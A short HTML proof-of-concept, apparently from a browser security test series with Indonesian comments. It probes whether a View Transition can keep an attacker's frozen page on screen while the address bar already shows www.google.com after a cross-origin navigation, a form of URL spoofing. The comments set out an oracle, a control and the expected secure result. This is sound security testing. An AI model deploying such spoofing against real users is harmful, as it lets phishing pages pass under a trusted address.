<!doctype html><meta charset=utf-8>
<!-- DELTA vs 35-02: di sana transisinya CROSS-document dan gerbang same-origin bisa membatalkannya
     PREDIKAT: bar melukis www.google.com sementara layar masih snapshot beku milikku
     ORACLE: rekam layar; ukur ms antara "bar berubah" dan "piksel berubah"
     CONTROL: hapus startViewTransition, sisakan location
     EXPECTED-SECURE: snapshot dibuang saat nav cross-document dimulai -> selisih 0 ms -->
<button onclick="go()">go</button>
<pre id=p></pre>
<div id=box style="view-transition-name:box;padding:20px;background:#dde">konten penyerang (dibekukan)</div>
<script>
const T = 'https://www.google.com/';
function go(){
  if (!document.startViewTransition) return p.textContent += '\nView Transition tidak ada = INERT (catat).';
  document.startViewTransition(() => { box.style.background = '#fdd'; location.href = T; });
  p.textContent += '\ntransisi dimulai + nav cross-origin ditembak di dalamnya';
}
p.textContent = 'REAL: ' + location.href;
</script>
